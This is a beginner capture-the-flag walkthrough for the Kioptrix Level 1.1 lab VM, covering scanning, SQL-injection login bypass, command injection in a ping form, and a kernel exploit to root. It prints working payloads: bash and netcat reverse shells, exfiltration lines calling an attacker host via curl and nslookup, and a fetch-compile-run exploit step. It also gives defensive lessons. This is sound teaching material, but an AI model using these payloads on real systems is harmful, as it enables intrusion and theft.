# Kioptrix: Level 1.1 (#2) — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
|---|---|
| **Machine** | Kioptrix: Level 1.1 (#2) |
| **Difficulty** | Easy |
| **Author** | loneferret (Kioptrix) |
| **Released** | February 11, 2011 |
| **VulnHub Entry** | [Kioptrix: Level 1.1 (#2) on VulnHub](https://vulnhub.com/entry/kioptrix-level-11-2,23/) |
| **Download** | [Kioptrix: Level 1.1 (#2) OVA](https://vulnhub.com/entry/kioptrix-level-11-2,23/#download) |
| **Attacker** | Kali Linux (attacker IP `192.168.56.10`, target IP `192.168.56.101`) |
| **Target OS** | Linux (CentOS 4.x, kernel 2.6.9-55.EL) |

> This is the second Kioptrix challenge (VulnHub calls it "Level 1.1", sometimes labeled "#2").
> It ships as a VMware image; the target gets its IP by **DHCP**, so the real address may differ.
> This guide uses the example target `192.168.56.101` — substitute whatever your scan finds.

## 0. What you will learn

- **Network discovery:** Finding a DHCP-issued VM on your isolated lab subnet.
- **Port & service enumeration:** Using Nmap to fingerprint an old CentOS/Apache box.
- **SQL injection (authentication bypass):** How a login form can be tricked into logging you in.
- **OS command injection:** How a "ping" web tool that runs a system command can be abused to run *your* command.
- **Getting a reverse shell:** Turning command execution into an interactive shell.
- **Linux privilege escalation:** Using a public kernel exploit to go from a low-privilege user to `root`.
- **Defensive thinking:** Blue-team lessons around input handling, old kernels, and service hardening.

> **A note on difficulty:** "Easy" here means the *concepts* are beginner-level, not that nothing can go wrong. Old VMs are finicky — if a step behaves differently, the box likely just booted slowly or your target IP changed.

## 1. Reconnaissance — finding the target

The Kioptrix VM requests an address via DHCP, so first we find it.

**Check your own attacker IP and interface names:**

```bash
ip a
```

> **How to read it:** Look for your lab interface (often `eth0`, `eth1`, or a `vboxnet`/`vmnet` adapter) and note the subnet, e.g. `192.168.56.0/24` with your Kali at `192.168.56.10`.

**Discover live hosts — Method A: `arp-scan`:**


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --localnet
```

**Method B: `netdiscover`:**

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
```

> **How to read it:** Each line is a live host: IP address, MAC address, and often the vendor/hostname. Your Kali is one entry; the Kioptrix box is the *other* Linux-looking entry.
> **Why it works:** ARP asks "who has this IP?" on the local segment, so any host that answers is alive — no ports need to be open.

**Confirm with an Nmap ping sweep (optional):**


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
nmap -sn 192.168.56.0/24
```

> **How to read it:** `-sn` finds live hosts *without* scanning ports. The line `Nmap scan report for 192.168.56.101` tells you a host is up.
> **Why it works:** This confirms reachability. From here on, this guide uses attacker `192.168.56.10` and target `192.168.56.101`.

![host discovery showing the target](images/01-recon-netdiscover.png)


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

With the target IP known, enumerate open ports and versions. For beginners, **this is the single most important phase** — everything exploits what you find here.

### 2.1 Full TCP port scan

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

> **How to read it:** `-p-` scans all 65,535 TCP ports. `--min-rate 1000` sends at least 1000 packets/sec (fine in a lab). `-T4` is an aggressive timing template. `-oA` saves results three ways (`.nmap`, `.gnmap`, `.xml`).
> **Why it works:** This catches services on unusual ports before we waste effort guessing.

### 2.2 Service detection & default scripts

```bash
sudo nmap -sC -sV -p 22,80,111,139,443,445,1024 -oA scans/services 192.168.56.101
```

> **How to read it:** `-sC` runs Nmap's safe default scripts; `-sV` probes each open port for a service banner/version. We narrow to the ports the full scan found.
> **Why it works:** Version banners are what tell us whether something is out of date and likely exploitable.

### 2.3 Realistic expected output for Kioptrix #2

Exact banners vary by build, but a typical result looks like this:

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at [DATE]
Nmap scan report for 192.168.56.101
Host is up (0.0008s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http        Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
```

> **How to read it:** Port **80** runs Apache and, importantly, a PHP web application. Common MySQL (3306) and SMB (139/445) are present too. The old **CentOS / kernel 2.6** build matters later for privilege escalation.
> **Why it works:** The web app is where the intended foothold lives. Confirm the kernel version once you have a shell, because a shell alone is not the goal — `root` is.

**Browse the web server:**

```bash
firefox http://192.168.56.101 &
```

You should see a login page (a "Remote System Administration" style form). Note the page source is sometimes interesting — comments occasionally hint at an `Administrator` account.

![nmap scan of Kioptrix #2](images/02-nmap.png)

## 3. Foothold

The path is two steps: **bypass the login**, then **exploit command injection in the ping tool**.

### 3.1 Step 1 — Authentication bypass via SQL injection

The login form on `index.php` checks your credentials against a SQL query. If the code naively builds the query string, we can break out of it.

In the **username** and/or **password** field, try:

```text
' OR '1'='1
```

or (commenting out the rest of the query):


> ### 📖 Concept — What is SQL injection?
>
> The application builds a query by **concatenating your input**:
>
> ```php
> $q = "SELECT * FROM users WHERE user='".$_POST['u']."' AND pass='".$_POST['p']."'";
> ```
>
> Supply `admin' -- ` and it becomes:
>
> ```sql
> SELECT * FROM users WHERE user='admin' -- ' AND pass='whatever'
> ```
>
> `-- ` starts a SQL comment (**the trailing space is required in MySQL**), so the
> password check is deleted and you are logged in as admin with no password. Your
> input escaped the *data* context and became *code*.
>
> **Detect it** by inserting `'`, `"`, `` ` ``, `)` or `--` and watching for a database
> error, a changed page length, or a different status code.
>
> **Payload shapes:**
>
> ```text
> ' OR 1=1 --                        tautology
> ' OR '1'='1                        string-context tautology
> 1' UNION SELECT 1,2,3 --           find the column count, then extract data
> 1' UNION SELECT user_login,user_pass,3 FROM wp_users --
> '; WAITFOR DELAY '0:0:5' --        blind/time-based confirmation
> ```
>
> ```bash
> sqlmap -u "http://target/page.php?id=1" --dbs
> sqlmap -u "http://target/page.php?id=1" -D wordpress -T wp_users --dump
> sqlmap -r request.txt --batch --level 3 --risk 2      # from a saved Burp request
> ```
>
> > **`sqlmap` is a tool, not a substitute for understanding.** When it fails the
> > reason is usually that you have not told it *where* the injectable parameter is,
> > that authentication is needed (`--cookie=`), or that the injection is
> > second-order. Confirm manually with a `'` first — it takes ten seconds and tells
> > you whether sqlmap has anything to work with.
>
> The fix is always the same: **prepared statements / bound parameters**, never string
> concatenation.
>
> **Deep dive:** [CONCEPTS §13.1 — SQL injection](../../docs/CONCEPTS.md#131-sql-injection-sqli)

```text
' OR 1=1 -- -
```

> **How to read it:** A normal query looks like `SELECT * FROM users WHERE username='x' AND password='y'`. Our input closes the quote and adds `OR 1=1`, which is always true, so the query returns a user row and the app logs us in.
> **Why it works:** The application concatenates user input directly into SQL instead of using parameterized queries. This is **SQL injection (SQLi)** — the login page is only the delivery method; the real vulnerability is unsanitized SQL. (The exact payload that works varies slightly by build — `' or '1'='1` and `admin' or 1=1 -- -` are both commonly reported.)

After logging in, you land on a **ping utility**: you enter a hostname/IP and the server runs `ping` for you.

### 3.2 Step 2 — Confirm OS command injection

The obvious guess: the form runs `ping <your-input>` in a shell. If it does not sanitize input, we can append our own command after a shell separator (`;`, `&&`, or `|`).

Type this into the ping field:


> ### 📖 Concept — Command injection
>
> The application passes your input to a shell:
>
> ```php
> system("ping -c 4 " . $_GET['host']);
> ```
>
> Break out with a shell **metacharacter** and append your own command:
>
> | Payload | Effect |
> | --- | --- |
> | `; id` | Run sequentially, regardless |
> | `\| id` | Pipe — run next |
> | `\|\| id` | Run only if the first **failed** |
> | `&& id` | Run only if the first **succeeded** |
> | `` `id` `` | Command substitution |
> | `$(id)` | Command substitution — preferred, nestable |
> | `%0a id` | A URL-encoded **newline** — works when `;` and `\|` are filtered |
>
> **When output comes back**, you are done: `<host>;id` prints the result.
>
> **When it does not** ("blind" injection), exfiltrate out-of-band:
>
> ```bash
> $(curl http://attacker/$(whoami))        # data in the URL of a request YOU receive
> $(nslookup $(whoami).attacker.com)       # data in DNS — survives most egress rules
> ; sleep 10                               # a pure timing oracle, needs no network at all
> ```
>
> Run your listener first (`nc -lvnp 80`, or `python3 -m http.server`) and **watch its
> log** — a request arriving with the hostname embedded is your proof, and the log also
> tells you which payload variant the filter allowed through.
>
> **If characters are stripped**, find out exactly what survives. Submit `;|&$\`(){}[]<>`
> as a single string and see which ones come back. Filters are usually a `str_replace`
> of a short list, and almost always miss something — commonly newline, or a doubled
> character (`;;` collapsing to `;` after one removal pass).
>
> **Deep dive:** [CONCEPTS §13.4 — Command injection](../../docs/CONCEPTS.md#134-command-injection)

```text
127.0.0.1; whoami
```

> **How to read it:** If the page shows something like `apache`, the shell ran **both** `ping 127.0.0.1` *and* `whoami` — our command executed on the server. That is **OS command injection**.
> **Why it works:** `;` separates commands in a shell. The app passed the whole string to the shell instead of treating it as a single hostname.

Confirm more context:

```text
127.0.0.1; id; uname -a
```

Expected output (example):

```text
uid=48(apache) gid=48(apache) groups=48(apache)
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
```

> **How to read it:** We run as user **`apache`** — an unprivileged web account, *not* root. The kernel is **2.6.9-55.EL** (CentOS). Remember this for privilege escalation.

> **Endpoint note:** The vulnerable form is often reached through the `index.php` login flow and posts to a handler sometimes observed as `pingit.php` (older writeups may call it `ping.php`). The **name of the endpoint varies by build** — what matters is that a web form runs `ping` with unfiltered input.

### 3.3 Get a reverse shell

A "reverse shell" makes the target connect *back* to us, giving us an interactive session.

**First, start a listener on Kali:**


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
nc -lvnp 4444
```

> **How to read it:** `nc` is Netcat. `-l` listen, `-v` verbose, `-n` no DNS, `-p 4444` on port 4444. Leave this running.

**Then inject a reverse-shell payload into the ping field:**

```text
127.0.0.1; bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
```

> **How to read it:** `bash -i` starts an interactive bash. `/dev/tcp/192.168.56.10/4444` is a Bash feature that opens a TCP connection to *our* listener. `>& ... 0>&1` redirects stdin, stdout and stderr through that connection so commands and output flow both ways.
> **Why it works:** Because we already have command execution on the target, the shell it spawns runs on the target but talks to us over the network.

> **How to read it (listener side):** You should see `connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] ...` followed by a prompt like `bash-3.00$`.

Alternative payload using `nc` if Bash's `/dev/tcp` is blocked:

```text
127.0.0.1; nc -e /bin/bash 192.168.56.10 4444
```

> **Note:** Not every `nc` build supports `-e`. If it fails, use the Bash `/dev/tcp` method above.

**Upgrade to a more usable shell (optional but recommended):**


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

> **How to read it:** This spawns a proper pseudo-terminal, so arrow keys, tab-completion, and interactive programs behave normally.

![command injection and reverse shell](images/03-command-injection-shell.png)


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

We are `apache`; we need `root`. On an old unpatched kernel, a public local exploit is the intended route.

### 4.1 Identify the kernel

```bash
uname -a
cat /etc/redhat-release 2>/dev/null
```

> **How to read it:** `2.6.9-55.EL` (CentOS 4.x) is decades out of date and has well-known local privilege-escalation vulnerabilities.

### 4.2 Find a matching exploit

On **Kali** (not the target), search Exploit-DB locally:


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit linux kernel 2.6 centos
searchsploit "Linux Kernel 2.6 < 2.6.19"
```

> **How to read it:** `searchsploit` searches your local Exploit-DB copy. Community writeups for this box commonly use the entries **EDB 9542** and **EDB 9545** — both target `Linux Kernel 2.6 < 2.6.19` on CentOS 4.4/4.5 and are labeled as a ring0 (root) local privilege escalation. The exact file number that works **varies by build**; let `searchsploit` and the exploit's own banner be your source of truth.

> **Why it works:** The kernel fails to validate something in a socket/sendpage code path, letting a local user corrupt kernel memory and execute code as `root`. The public exploit compiles a tiny program that triggers this.

### 4.3 Transfer, compile, and run the exploit

**On Kali, serve the exploit file** (copy it to your web root and start the server):

```bash
cp /usr/share/exploitdb/exploits/linux/local/9542.c .
python3 -m http.server 8000
```

**On the target shell, download and compile it:**

```bash
cd /tmp
wget http://192.168.56.10:8000/9542.c -O 9542.c
gcc -o 9542 9542.c
./9542
```

> **How to read it:** `wget` pulls the file from your Python web server. `gcc -o 9542 9542.c` compiles C source into an executable. Running it prints diagnostics (e.g. `[-] check ur uid`) and, if successful, leaves you at a `#` root prompt.

**Confirm root:**

```bash
id
whoami
```

Expected output:

```text
uid=0(root) gid=0(root) groups=48(apache)
root
```

> **How to read it:** `uid=0(root)` means full control. There is usually **no flag file** on this VM — a root shell *is* the win. Do not invent flag contents; if `/root` is empty, that is normal.

![kernel exploit root shell](images/04-root-shell.png)

### 4.4 Alternative / simpler routes (optional knowledge)

- **Sudo misconfiguration:** If `sudo -l` shows a command your user can run as root without a password, abuse that instead. On many builds `apache` cannot use sudo, so the kernel exploit is the intended path.
- **MySQL:** If you find working MySQL credentials, note that MySQL **running as root** can sometimes write files or (with a UDF library) execute commands as root. This is more common on later Kioptrix levels and is an alternative if the kernel exploit misbehaves.

> **Note:** Don't force an alternative if the kernel exploit already worked — reach for those only if the intended path fails on your specific build.

## 5. Summary of vulnerabilities

| Vulnerability | CVE | Affected Component | Port(s) | Impact | Notes |
|---|---|---|---|---|---|
| SQL injection (authentication bypass) | N/A (design flaw) | Custom PHP login (`index.php`) | 80 (HTTP) | Bypass login | Unsanitized input concatenated into SQL. |
| OS command injection | N/A (design flaw) | Web "ping" tool (`pingit.php`/form) | 80 (HTTP) | Remote Code Execution as `apache` | Input passed to a shell without filtering. |
| Linux kernel local privilege escalation | See Exploit-DB 9542 / 9545 | Linux Kernel 2.6 < 2.6.19 (CentOS 4.x) | local | Low user → root | Exact EDB ID / CVE varies by build. |
| Unnecessary exposed services | N/A (misconfiguration) | MySQL (3306), SMB (139/445) | 3306, 139, 445 | Increased attack surface | Not required for the intended path. |

> **How to read it:** The chain is web-app flaws for the foothold, then an unpatched kernel for root. Every step is a *missing control*, not a single magic bug.

## 6. Defensive lessons (blue team)

- **Never build SQL by string concatenation.** Use **parameterized queries / prepared statements** so user input can never change the query's meaning. This kills authentication-bypass SQLi at the source.
- **Never pass user input to a shell.** Avoid `system()`/`exec()` for things like "ping a hostname." Use language-native libraries, validate input strictly (e.g. allow only IP-address characters), and never let metacharacters like `;`, `&&`, `|`, `` ` `` reach a shell.
- **Patch and upgrade aggressively.** A 2007-era kernel is a guaranteed root. Track EOL software in an inventory and patch on a schedule.
- **Principle of least privilege for services.** The web app ran as `apache` — good. But the *kernel* bug let that low user become root; keeping the kernel current is what actually contains the blast radius.
- **Reduce surface area.** If MySQL or SMB are not needed, do not expose them. Bind services to localhost and firewall everything else.
- **Detect reverse shells.** Alert on unusual **outbound** connections from servers (a web server should rarely open a shell to an internal host on port 4444). Host firewalls that block outbound traffic to non-standard ports break many reverse shells.
- **Log and monitor web input.** WAFs and request logging that flag SQL keywords or shell metacharacters in form fields give you early warning.

## 7. References

Real community writeups consulted during research (they document the same path):

- [Kioptrix: Level 1.1 (#2) — carmar.is](https://carmar.is/posts/2024/01/kioptrix-1-1/)
- [Kioptrix Level 1.1 (#2) Writeup — Syrion](https://syrion.me/kioptrix-level-1-1-writeup/)
- [Kioptrix Level 1.1 (#2) — shifty0g](https://shifty0g.github.io/posts/kioptrix-level-2/)
- [Kioptrix 1.1 (#2) Writeup — The Hacking Blog](https://thehackingblog.com/2018/07/26/kioptrix-1-1-2-writeup/)
- [Kioptrix Level 1.1 Walkthrough — highon.coffee](https://highon.coffee/blog/kioptrix-level-1-1-walkthrough/)
- [VulnHub Recipe — Kioptrix Level 1.1 (#2)](https://vulnhub.com/entry/kioptrix-level-11-2,23/)

## 8. Screenshot checklist

- [ ] `images/01-recon-netdiscover.png` — host discovery showing the target IP
- [ ] `images/02-nmap.png` — Nmap showing port 80 (Apache) and the old CentOS build
- [ ] `images/03-command-injection-shell.png` — `; whoami` injection and the reverse shell
- [ ] `images/04-root-shell.png` — `id`/`whoami` confirming `uid=0(root)` after the kernel exploit
- [ ] `images/05-proof.png` — Optional proof (root shell or `/root` listing)

> **How to read it:** Store screenshots in `labs/kioptrix-level-11-2/images/` and reference them with the relative paths shown.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---
*Part of the [Cybersecurity101-Labs](../../README.md) collection. Educational use only in authorized lab environments.*
